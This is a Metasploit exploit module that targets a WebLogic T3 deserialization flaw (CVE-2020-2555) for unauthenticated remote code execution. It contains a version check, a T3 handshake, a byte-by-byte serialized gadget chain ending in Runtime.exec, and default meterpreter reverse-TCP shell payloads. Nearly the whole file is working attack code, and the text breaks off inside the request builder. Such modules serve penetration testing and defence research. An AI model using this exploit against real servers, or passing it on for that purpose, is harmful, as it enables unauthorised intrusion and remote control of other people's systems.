##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WebLogic Server Deserialization RCE - BadAttributeValueExpException',
        'Description' => %q{
          There exists a Java object deserialization vulnerability
          in multiple versions of WebLogic.
 
          Unauthenticated remote code execution can be achieved
          by sending a serialized BadAttributeValueExpException object
          over the T3 protocol to vulnerable WebLogic servers.
        },
        'License' => MSF_LICENSE,
        'Author' =>
        [
          'Jang', # Vuln Discovery
          'Y4er', # PoC
          'Shelby Pace' # Metasploit Module
        ],
        'References' =>
          [
            [ 'CVE', '2020-2555' ],
            [ 'URL', 'https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server' ],
            [ 'URL', 'https://github.com/Y4er/CVE-2020-2555' ]
          ],
        'Platform' => %w[unix linux win],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Privileged'  => false,
        'Targets' =>
          [
            [
              'Windows',
              {
                'Platform' => 'win',
                'Arch' => [ ARCH_X86, ARCH_X64 ],
                'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Unix',
              {
                'Platform' => %w[unix linux],
                'CmdStagerFlavor' => 'printf',
                'Arch' => [ ARCH_X86, ARCH_X64 ],
                'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
          ],
        'DisclosureDate' => '2020-01-15',
        'DefaultTarget' => 0
      )
    )
 
    register_options([ Opt::RPORT(7001) ])
  end
 
  def check
    connect
 
    web_req = "GET /console/login/LoginForm.jsp HTTP/1.1\nHost: #{peer}\n\n"
    sock.put(web_req)
    sleep(2)
    res = sock.get_once
 
    versions = [ Gem::Version.new('12.1.3.0.0'), Gem::Version.new('12.2.1.3.0'), Gem::Version.new('12.2.1.4.0') ]
 
    return CheckCode::Unknown('Failed to obtain response from service') unless res
 
    /WebLogic\s+Server\s+Version:\s+(?<version>\d+\.\d+\.\d+\.*\d*\.*\d*)/ =~ res
    return CheckCode::Unknown('Failed to detect WebLogic') unless version
 
    @version_no = Gem::Version.new(version)
    print_status("WebLogic version detected: #{@version_no}")
 
    return CheckCode::Appears if versions.include?(@version_no)
 
    CheckCode::Detected('Version of WebLogic is not vulnerable')
  ensure
    disconnect
  end
 
  def exploit
    super
 
    connect
    print_status('Sending handshake...')
    t3_handshake
 
    if target.name == 'Windows'
      win_obj = cmd_psh_payload(payload.encoded, payload_instance.arch.first, { remove_comspec: true })
      win_obj.prepend('cmd.exe /c ')
      win_obj = build_payload_obj(win_obj)
      t3_send(win_obj)
    else
      execute_cmdstager
    end
 
  ensure
    disconnect
  end
 
  def t3_handshake
    # t3 12.2.1\nAS:255
    # \nHL:19\nMS:100000
    # 00\n\n
    shake = '74332031322e322e310a41533a323535'
    shake << '0a484c3a31390a4d533a313030303030'
    shake << '30300a0a'
 
    sock.put([shake].pack('H*'))
    sleep(1)
    sock.get_once
  end
 
  def build_payload_obj(payload_data)
    payload_obj = 'aced' # STREAM_MAGIC
    payload_obj << '0005' # STREAM_VERSION
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '002e' # Class name length: 46
    payload_obj << '6a617661782e6d616e61' # Class name: javax.management.BadAttributeValueExpException
    payload_obj << '67656d656e742e426164'
    payload_obj << '41747472696275746556'
    payload_obj << '616c7565457870457863'
    payload_obj << '657074696f6e'
    payload_obj << 'd4e7daab632d4640' # SerialVersionUID
    payload_obj << '020001' # Serialization flag, field num = 1
    payload_obj << '4c0003' # Field type code: 4c = Object, field name length: 3
    payload_obj << '76616c' # Field name: val
    payload_obj << '740012' # String, length: 18
    payload_obj << '4c6a6176612f6c616e672f4f626a6563743b' # Ljava/lang/Object;
    payload_obj << '7872' # end block data, TC_CLASSDESC
    payload_obj << '0013' # Class name length: 19
    payload_obj << '6a6176612e6c616e672e' # java.lang.Exception
    payload_obj << '457863657074696f6e'
    payload_obj << 'd0fd1f3e1a3b1cc4' # SerialVersionUID
    payload_obj << '020000' # Serializable, No fields
    payload_obj << '7872' # end block data, TC_CLASSDESC
    payload_obj << '0013' # Class name length: 19
    payload_obj << '6a6176612e6c616e672e' # java.lang.Throwable
    payload_obj << '5468726f7761626c65'
    payload_obj << 'd5c635273977b8cb' # SerialVersionUID
    payload_obj << '030004' # ?, then 4 fields
    payload_obj << '4c0005' # Field type: Object, field name length: 5
    payload_obj << '6361757365' # Field name: cause
    payload_obj << '740015' # String, length: 21
    payload_obj << '4c6a6176612f6c616e67' # Ljava/lang/Throwable;
    payload_obj << '2f5468726f7761626c653b'
    payload_obj << '4c000d' # Field type: Object, field name length: 13
    payload_obj << '64657461696c4d657373616765' # Field name: detailMessage
    payload_obj << '740012' # String, length: 18
    payload_obj << '4c6a6176612f6c616e67' # Ljava/lang/String;
    payload_obj << '2f537472696e673b'
    payload_obj << '5b000a' # Field type: 5b = array, field name length: 10
    payload_obj << '737461636b5472616365' # Field name: stackTrace
    payload_obj << '74001e' # String, length: 30
    payload_obj << '5b4c6a6176612f6c616e' # [Ljava/lang/StackTraceElement;
    payload_obj << '672f537461636b547261'
    payload_obj << '6365456c656d656e743b'
    payload_obj << '4c0014' # Field type: Object, field name length: 20
    payload_obj << '73757070726573736564' # Field name: suppressedExceptions
    payload_obj << '457863657074696f6e73'
    payload_obj << '740010' # String, length: 16
    payload_obj << '4c6a6176612f7574696c' # Ljava/util/List;
    payload_obj << '2f4c6973743b'
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0008' # handle?
    payload_obj << '7075' # TC_NULL, TC_ARRAY
    payload_obj << '72001e' # TC_CLASSDESC, Class name length: 30
    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.StackTraceElement;
    payload_obj << '672e537461636b547261'
    payload_obj << '6365456c656d656e743b'
    payload_obj << '02462a3c3cfd2239' # SerialVersionUID
    payload_obj << '020000' # Serializable, No fields
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000001'
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '001b' # Class name length: 27
    payload_obj << '6a6176612e6c616e672e' # java.lang.StackTraceElement
    payload_obj << '537461636b5472616365'
    payload_obj << '456c656d656e74'
    payload_obj << '6109c59a2636dd85' # SerialVersionUID
    payload_obj << '020004' # Serializable, 4 fields
    payload_obj << '49000a' # Field type: 49 = Integer, field name length: 10
    payload_obj << '6c696e654e756d626572' # lineNumber
    payload_obj << '4c000e' # Field type: Object, field name length: 14
    payload_obj << '6465636c6172696e6743'
    payload_obj << '6c617373' # declaringClass
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0005' # handle
    payload_obj << '4c0008' # Field type: Object, field name length: 8
    payload_obj << '66696c654e616d65' # fileName
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0005' # handle
    payload_obj << '4c000a' # Field type: Object, field name length: 10
    payload_obj << '6d6574686f644e616d65' # methodName
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0005' # handle
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000028'
 
    class_name = Rex::Text.rand_text_alphanumeric(8..14)
    formatted_class = class_name.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
 
    payload_obj << '74' # String
    payload_obj << class_name.length.to_s(16).rjust(4, '0')
    payload_obj << formatted_class  # Originally Weblogic_2555 -> PoC class name
    payload_obj << '74' # String
    payload_obj << (class_name.length + 5).to_s(16).rjust(4, '0')
    payload_obj << formatted_class # Originally Weblogic_2555.java
    payload_obj << '2e6a617661' # .java
    payload_obj << '740004' # String, length: 4
    payload_obj << '6d61696e' # main
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '0026' # Class name length: 38
    payload_obj << '6a6176612e7574696c2e' # java.util.Collections$UnmodifiableList
    payload_obj << '436f6c6c656374696f6e'
    payload_obj << '7324556e6d6f64696669'
    payload_obj << '61626c654c697374'
    payload_obj << 'fc0f2531b5ec8e10' # SerialVersionUID
    payload_obj << '020001' # Serializable, 1 field
    payload_obj << '4c0004' # Field type: Object, field name length: 4
    payload_obj << '6c697374' # list
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0007' # handle
    payload_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '002c' # Class name length: 44
    payload_obj << '6a6176612e7574696c2e' # java.util.Collections$UnmodifiableCollection
    payload_obj << '436f6c6c656374696f6e'
    payload_obj << '7324556e6d6f64696669'
    payload_obj << '61626c65436f6c6c6563'
    payload_obj << '74696f6e'
    payload_obj << '19420080cb5ef71e' # SerialVersionUID
    payload_obj << '020001' # Serializable, 1 field
    payload_obj << '4c0001' # Field type: Object, field name length: 1
    payload_obj << '63' # Field name: c
    payload_obj << '740016' # String, length: 22
    payload_obj << '4c6a6176612f7574696c' # Ljava/util/Collection;
    payload_obj << '2f436f6c6c656374696f'
    payload_obj << '6e3b'
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '0013' # Class name length: 19
    payload_obj << '6a6176612e7574696c2e' # java.util.ArrayList
    payload_obj << '41727261794c697374'
    payload_obj << '7881d21d99c7619d' # SerialVersionUID
    payload_obj << '030001' # ?, 1 field
    payload_obj << '490004' # Field type: Integer, field name length: 4
    payload_obj << '73697a65' # size
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '7704' # TC_BLOCKDATA, length: 4
    payload_obj << '00000000'
    payload_obj << '7871' # TC_ENDBLOCKDATA, TC_REFERENCE
    payload_obj << '007e0015' # handle
    payload_obj << '78' # TC_ENDBLOCKDATA
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '0024' # Class name length: 36
    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.filter.LimitFilter
    payload_obj << '6f6c2e7574696c2e6669'
    payload_obj << '6c7465722e4c696d6974'
    payload_obj << '46696c746572'
    payload_obj << limit_filter_uid # SerialVersionUID
    payload_obj << '020006' # Serializable, 6 fields
    payload_obj << '49000b' # Field type: Integer, field name length: 11
    payload_obj << '6d5f635061676553697a65' # m_cPageSize
    payload_obj << '490007' # Field type: Integer, field name length: 7
    payload_obj << '6d5f6e50616765' # m_nPage
    payload_obj << '4c000c' # Field type: Object, field name length: 12
    payload_obj << '6d5f636f6d70617261746f72' # m_comparator
    payload_obj << '740016' # String, length: 22
    payload_obj << '4c6a6176612f7574696c' # Ljava/util/Comparator;
    payload_obj << '2f436f6d70617261746f'
    payload_obj << '723b'
    payload_obj << '4c0008' # Field type: Object, field name length: 8
    payload_obj << '6d5f66696c746572' # m_filter
    payload_obj << '74001a' # String, length: 26
    payload_obj << '4c636f6d2f74616e676f' # Lcom/tangosol/util/Filter;
    payload_obj << '736f6c2f7574696c2f46'
    payload_obj << '696c7465723b'
    payload_obj << '4c000f' # Field type: Object, field name length: 15
    payload_obj << '6d5f6f416e63686f7242' # m_oAnchorBottom
    payload_obj << '6f74746f6d'
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0001' # handle
    payload_obj << '4c000c' # Field type: Object, field name length: 12
    payload_obj << '6d5f6f416e63686f72546f70' # m_oAnchorTop
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0001' # handle
 
    unless @version_no == Gem::Version.new('12.1.3.0.0')
      payload_obj << add_class_desc
    end
 
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '00000000'
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '002c' # Class name length: 44
    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.ChainedExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e4368'
    payload_obj << '61696e65644578747261'
    payload_obj << '63746f72'
    payload_obj << chained_extractor_uid # SerialVersionUID
    payload_obj << '020000' # Serializable, no fields
    payload_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '0036' # Class name length: 54
    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.AbstractCompositeExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e4162'
    payload_obj << '737472616374436f6d70'
    payload_obj << '6f736974654578747261'
    payload_obj << '63746f72'
    payload_obj << '086b3d8c05690f44' # SerialVersionUID
    payload_obj << '020001' # Serializable, 1 field
    payload_obj << '5b000c' # Field type: Array, field name length: 12
    payload_obj << '6d5f61457874726163746f72' # m_aExtractor
    payload_obj << '740023' # String, length: 35
    payload_obj << '5b4c636f6d2f74616e67' # [Lcom/tangosol/util/ValueExtractor;
    payload_obj << '6f736f6c2f7574696c2f'
    payload_obj << '56616c75654578747261'
    payload_obj << '63746f723b'
    payload_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '002d' # Class name length: 45
    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.AbstractExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e4162'
    payload_obj << '73747261637445787472'
    payload_obj << '6163746f72'
    payload_obj << abstract_extractor_uid # SerialVersionUID
    payload_obj << '020001' # Serializable, 1 field
    payload_obj << '490009' # Field type: Integer, field name length: 9
    payload_obj << '6d5f6e546172676574' # m_nTarget
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0032' # Class name length: 50
    payload_obj << '5b4c636f6d2e74616e67' # [Lcom.tangosol.util.extractor.ReflectionExtractor;
    payload_obj << '6f736f6c2e7574696c2e'
    payload_obj << '657874726163746f722e'
    payload_obj << '5265666c656374696f6e'
    payload_obj << '457874726163746f723b'
    payload_obj << 'dd8b89aed70273ca' # SerialVersionUID
    payload_obj << '020000' # Serializable, no fields
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000003'
    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    payload_obj << '002f' # Class name length: 47
    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.ReflectionExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e5265'
    payload_obj << '666c656374696f6e4578'
    payload_obj << '74726163746f72'
    payload_obj << reflection_extractor_uid # SerialVersionUID
    payload_obj << '02000' # Serializable, variable fields orig: 020002
    payload_obj << reflect_extract_count
    payload_obj << '5b0009' # Field type: Array, field name length: 9
    payload_obj << '6d5f616f506172616d' # m_aoParam
    payload_obj << '740013' # String, length: 19
    payload_obj << '5b4c6a6176612f6c616e' # [Ljava/lang/Object;
    payload_obj << '672f4f626a6563743b'
    payload_obj << add_sect
    payload_obj << '4c0009' # Object, length: 9
    payload_obj << '6d5f734d6574686f64' # m_sMethod
    payload_obj << '71' # TC_REFERENCE
    payload_obj << '007e0005' # handle
    payload_obj << '7871' # TC_ENDBLOCKDATA, TC_REFERENCE
    payload_obj << (change_handle? ? '007e001d' : '007e001e')
    payload_obj << '00000000'
    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0013' # Class name length: 19
    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.Object;
    payload_obj << '672e4f626a6563743b'
    payload_obj << '90ce589f1073296c' # SerialVersionUID
    payload_obj << '020000' # Serializable, no fields
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000002'
    payload_obj << '74000a' # String, length: 10
    payload_obj << '67657452756e74696d65' # getRuntime
    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0012' # Class name length: 18
    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.Class;
    payload_obj << '672e436c6173733b'
    payload_obj << 'ab16d7aecbcd5a99' # SerialVersionUID
    payload_obj << '020000' # Serializable, no fields
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << add_tc_null
    payload_obj << '740009' # String, length: 9
    payload_obj << '6765744d6574686f64' # getMethod
    payload_obj << '7371' # TC_OBJECT, TC_REFERENCE
    payload_obj << (change_handle? ? '007e0021' : '007e0022')
    payload_obj << '00000000'
    payload_obj << '7571' # TC_ARRAY, TC_REFERENCE
    payload_obj << (change_handle? ? '007e0024' : '007e0025')
    payload_obj << '00000002' # array size: 2
    payload_obj << '7075' # TC_NULL, TC_ARRAY
    payload_obj << '71' # TC_REFERENCE
    payload_obj << (change_handle? ? '007e0024' : '007e0025')
    payload_obj << '00000000'
    payload_obj << add_tc_null
    payload_obj << '740006' # TC_STRING, length: 6
    payload_obj << '696e766f6b65' # invoke
    payload_obj << '7371' # TC_OBJECT, TC_REFERENCE
    payload_obj << (change_handle? ? '007e0021' : '007e0022')
    payload_obj << '00000000'
    payload_obj << '7571' # TC_ARRAY, TC_REFERENCE
    payload_obj << (change_handle? ? '007e0024' : '007e0025')
    payload_obj << '00000001'
    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0013' # Class name length: 19
    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.String;
    payload_obj << '672e537472696e673b'
    payload_obj << 'add256e7e91d7b47' # SerialVersionUID
    payload_obj << '020000' # Serializable, no fields
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000003'
 
    payload_bin = format_payload(payload_data)
    payload_obj << payload_bin
 
    # Original data
    # ---------------------------
    # payload_obj << '740007'                             # String, length: 7
    # payload_obj << '2f62696e2f7368'                     # /bin/sh
    # payload_obj << '740002'                             # String, length: 2
    # payload_obj << '2d63'                               # -c
    # payload_obj << '740017'                             # String, length: 23
    # payload_obj << '746f756368202f746d70'               # touch /tmp/blah_ze_blah
    # payload_obj << '2f626c61685f7a655f62'
    # payload_obj << '6c6168'
    # ---------------------------
    payload_obj << add_tc_null
 
    payload_obj << '740004' # String, length: 4
    payload_obj << '65786563' # exec
    payload_obj << '7070' # TC_NULL, TC_NULL
    payload_obj << '7672' # TC_CLASS, TC_CLASSDESC
    payload_obj << '0011' # Class name length: 17
    payload_obj << '6a6176612e6c616e672e' # java.lang.Runtime
    payload_obj << '52756e74696d65'
    payload_obj << '00000000000000000000'
    payload_obj << '00'
    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
  end
 
  def change_handle?
    @version_no == Gem::Version.new('12.1.3.0.0')
  end
 
  def limit_filter_uid
    case @version_no
    when Gem::Version.new('12.1.3.0.0')
      '99022596d7b45953'
    when Gem::Version.new('12.2.1.3.0')
      'ab2901b976c4e271'
    else
      '954e4590be89865f'
    end
  end
 
  def chained_extractor_uid
    case @version_no
    when Gem::Version.new('12.1.3.0.0')
      '889f81b0945d5b7f'
    when Gem::Version.new('12.2.1.3.0')
      '06ee10433a4cc4b4'
    else
      '435b250b72f63db5'
    end
  end
 
  def abstract_extractor_uid
    case @version_no
    when Gem::Version.new('12.1.3.0.0')
      '658195303e723821'
    when Gem::Version.new('12.2.1.3.0')
      '752289ad4d460138'
    else
      '9b1be18ed70100e5'
    end
  end
 
  def reflection_extractor_uid
    case @version_no
    when Gem::Version.new('12.1.3.0.0')
      'ee7ae995c02fb4a2'
    when Gem::Version.new('12.2.1.3.0')
      '87973791b26429dd'
    else
      '1f62f564b951b614'
    end
  end
 
  def reflect_extract_count
    case @version_no
    when Gem::Version.new('12.2.1.3.0')
      '3'
    else
      '2'
    end
  end
 
  def add_sect
    sect = ''
 
    if @version_no == Gem::Version.new('12.2.1.3.0')
      sect << '4c0011' # Object, length: 17
      sect << '6d5f657874726163746f' # m_extractorCached
      sect << '72436163686564'
      sect << '71' # TC_REFERENCE
      sect << '007e0001' # handle
    end
 
    sect
  end
 
  def add_class_desc
    class_desc = ''
    class_desc << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC
    class_desc << '0034' # Class name length: 52
    class_desc << '636f6d2e74616e676f73' # com.tangosol.util.filter.AbstractQueryRecorderFilter
    class_desc << '6f6c2e7574696c2e6669'
    class_desc << '6c7465722e4162737472'
    class_desc << '61637451756572795265'
    class_desc << '636f7264657246696c74'
    class_desc << '6572'
    class_desc << 'f3b98201f680eb90' # SerialVersionUID
    class_desc << '020000' # Serializable, no fields
  end
 
  def add_tc_null
    return '70' if @version_no == Gem::Version.new('12.2.1.3.0')
 
    ''
  end
 
  def t3_send(payload_obj)
    print_status('Sending object...')
 
    request_obj = '000009f3' # Original packet length
    request_obj << '016501' # CMD_IDENTIFY_REQUEST, flags
    request_obj << 'ffffffffffffffff'
    request_obj << '00000071'
    request_obj << '0000ea60'
    request_obj << '00000018432ec6'
    request_obj << 'a2a63985b5af7d63e643'
    request_obj << '83f42a6d92c9e9af0f94'
    request_obj << '72027973720078720178'
    request_obj << '720278700000000c0000'
    request_obj << '00020000000000000000'
    request_obj << '00000001007070707070'
    request_obj << '700000000c0000000200'
    request_obj << '00000000000000000000'
    request_obj << '01007006'
    request_obj << 'fe010000' # separator
    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION
    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    request_obj << '001d' # Class name length: 29
    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.ClassTableEntry
    request_obj << '6a766d2e436c61737354'
    request_obj << '61626c65456e747279'
    request_obj << '2f52658157f4f9ed' # SerialVersionUID
    request_obj << '0c0000' # flags?
    request_obj << '787072' # TC_ENDBLOCKDATA, TC_NULL, TC_CLASSDESC
    request_obj << '0024' # Class name length: 36
    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.PackageInfo
    request_obj << '6f6d6d6f6e2e696e7465'
    request_obj << '726e616c2e5061636b61'
    request_obj << '6765496e666f'
    request_obj << 'e6f723e7b8ae1ec9' # SerialVersionUID
    request_obj << '020009' # Serializable, 9 fields
    request_obj << '490005' # Field type: Int, field name length: 5
    request_obj << '6d616a6f72' # major
    request_obj << '490005' # Field type: Int, field name length: 5
    request_obj << '6d696e6f72' # minor
    request_obj << '49000b' # Field type: Int, field name length: 11
    request_obj << '70617463685570646174' # patchUpdate
    request_obj << '65'
    request_obj << '49000c' # Field type: Int, field name length: 12
    request_obj << '726f6c6c696e67506174' # rollingPatch
    request_obj << '6368'
    request_obj << '49000b' # Field type: Int, field name length: 11
    request_obj << '73657276696365506163' # servicePack
    request_obj << '6b'
    request_obj << '5a000e' # Field type: Z = Bool, field name length: 14
    request_obj << '74656d706f7261727950' # temporaryPatch
    request_obj << '61746368'
    request_obj << '4c0009' # Field type: Object, field name length: 9
    request_obj << '696d706c5469746c65' # implTitle
    request_obj << '740012' # String, length: 18
    request_obj << '4c6a6176612f6c616e67' # Ljava/lang/String;
    request_obj << '2f537472696e673b'
    request_obj << '4c000a' # Field type: Object, field name length: 10
    request_obj << '696d706c56656e646f72' # implVendor
    request_obj << '71007e0003' # TC_REFERENCE, handle
    request_obj << '4c000b' # Field type: Object, field name length: 11
    request_obj << '696d706c56657273696f6e' # implVersion
    request_obj << '71007e0003' # TC_REFERENCE, handle
    request_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    request_obj << '7702' # TC_ENDBLOCKDATA
    request_obj << '000078'
    request_obj << 'fe010000' # separator
 
    request_obj << payload_obj
 
    request_obj << 'fe010000' # separator
    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION
    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    request_obj << '001d' # Class name length: 29
    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.ClassTableEntry
    request_obj << '6a766d2e436c61737354'
    request_obj << '61626c65456e747279'
    request_obj << '2f52658157f4f9ed' # SerialVersionUID
    request_obj << '0c0000'
    request_obj << '787072' # TC_ENDBLOCKDATA, TC_NULL, TC_CLASSDESC
    request_obj << '0021' # Class name length: 33
    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.PeerInfo
    request_obj << '6f6d6d6f6e2e696e7465'
    request_obj << '726e616c2e5065657249'
    request_obj << '6e666f'
    request_obj << '585474f39bc908f1' # SerialVersionUID
    request_obj << '020007' # Serializable, 7 fields
    request_obj << '490005' # Field type: Int, field name length: 5
    request_obj << '6d616a6f72' # major
    request_obj << '490005' # Field type: Int, field name length: 5
    request_obj << '6d696e6f72' # minor
    request_obj << '49000b' # Field type: Int, field name length: 11
    request_obj << '70617463685570646174' # patchUpdate
    request_obj << '65'
    request_obj << '49000c' # Field type: Int, field name length: 12
    request_obj << '726f6c6c696e67506174' # rollingPatch
    request_obj << '6368'
    request_obj << '49000b' # Field type: Int, field name length: 11
    request_obj << '73657276696365506163' # servicePack
    request_obj << '6b'
    request_obj << '5a000e' # Field type: Z = Bool, field name length: 14
    request_obj << '74656d706f7261727950' # temporaryPatch
    request_obj << '61746368'
    request_obj << '5b0008' # Field type: Array, field name length: 8
    request_obj << '7061636b61676573' # packages
    request_obj << '740027' # String, length: 39
    request_obj << '5b4c7765626c6f676963' # [Lweblogic/common/internal/PackageInfo;
    request_obj << '2f636f6d6d6f6e2f696e'
    request_obj << '7465726e616c2f506163'
    request_obj << '6b616765496e666f3b'
    request_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC
    request_obj << '0024' # Class name length: 36
    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.VersionInfo
    request_obj << '6f6d6d6f6e2e696e7465'
    request_obj << '726e616c2e5665727369'
    request_obj << '6f6e496e666f'
    request_obj << '972245516452463e' # SerialVersionUID
    request_obj << '020003' # Serializable, 3 fields
    request_obj << '5b0008' # Field type: Array, field name length: 8
    request_obj << '7061636b61676573' # packages
    request_obj << '71007e0003' # TC_REFERENCE, handle
    request_obj << '4c000e' # Field type: Object, field name length: 14
    request_obj << '72656c65617365566572' # releaseVersion
    request_obj << '73696f6e'
    request_obj << '740012' # String, length: 18
    request_obj << '4c6a6176612f6c616e67' # Ljava/lang/String;
    request_obj << '2f537472696e673b'
    request_obj << '5b0012' # Field type: Array, field name length: 18
    request_obj << '76657273696f6e496e66' # versionInfoAsBytes
    request_obj << '6f41734279746573'
    request_obj << '740002' # String, length: 2
    request_obj << '5b42' # [B
    request_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC
    request_obj << '0024' # Class name length: 36
    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.PackageInfo
    request_obj << '6f6d6d6f6e2e696e7465'
    request_obj << '726e616c2e5061636b61'
    request_obj << '6765496e666f'
    request_obj << 'e6f723e7b8ae1ec9' # SerialVersionUID
    request_obj << '020009' # Serializable, 9 fields
    request_obj << '490005' # Field type: Int, field name length: 5
    request_obj << '6d616a6f72' # major
    request_obj << '490005' # Field type: Int, field name length: 5
    request_obj << '6d696e6f72' # minor
    request_obj << '49000b' # Field type: Int, field name length: 11
    request_obj << '70617463685570646174' # patchUpdate
    request_obj << '65'
    request_obj << '49000c' # Field type: Int, field name length: 12
    request_obj << '726f6c6c696e67506174' # rollingPatch
    request_obj << '6368'
    request_obj << '49000b' # Field type: Int, field name length: 11
    request_obj << '73657276696365506163' # servicePack
    request_obj << '6b'
    request_obj << '5a000e' # Field type: Z = Bool, field name length: 14
    request_obj << '74656d706f7261727950' # temporaryPatch
    request_obj << '61746368'
    request_obj << '4c0009' # Field type: Object, field name length: 9
    request_obj << '696d706c5469746c65' # implTitle
    request_obj << '71007e0005' # TC_REFERENCE, handle
    request_obj << '4c000a' # Field type: Object, field name length: 10
    request_obj << '696d706c56656e646f72' # implVendor
    request_obj << '71007e0005' # TC_REFERENCE, handle
    request_obj << '4c000b' # Field type: Object, field name length: 11
    request_obj << '696d706c56657273696f' # implVersion
    request_obj << '6e'
    request_obj << '71007e0005' # TC_REFERENCE, handle
    request_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL
    request_obj << '7702000078' # TC_BLOCKDATA, 2 bytes, TC_ENDBLOCKDATA
    request_obj << 'fe00ff' # separator
    request_obj << 'fe010000'
    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION
    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    request_obj << '0013' # Class name length: 19
    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.JVMID
    request_obj << '6a766d2e4a564d4944'
    request_obj << 'dc49c23ede121e2a' # SerialVersionUID
    request_obj << '0c0000'
    request_obj << '787077' # TC_ENDBLOCKDATA, TC_NULL, TC_BLOCKDATA
    request_obj << '4621'
    request_obj << '000000000000000000'
    request_obj << '09' # length: 9
    request_obj << '3132372e302e312e31' # 127.0.1.1
    request_obj << '000b' # length: 11
    request_obj << '75732d6c2d627265656e' # us-l-breens
    request_obj << '73'
    request_obj << 'a53caff10000000700'
    request_obj << '001b59'
    request_obj << 'ffffffffffffffffffff'
    request_obj << 'ffffffffffffffffffff'
    request_obj << 'ffffffff'
    request_obj << '0078'
    request_obj << 'fe010000' # separator
    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION
    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC
    request_obj << '0013' # Class name length: 19
    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.JVMID
    request_obj << '6a766d2e4a564d4944'
    request_obj << 'dc49c23ede121e2a' # SerialVersionUID
    request_obj << '0c0000'
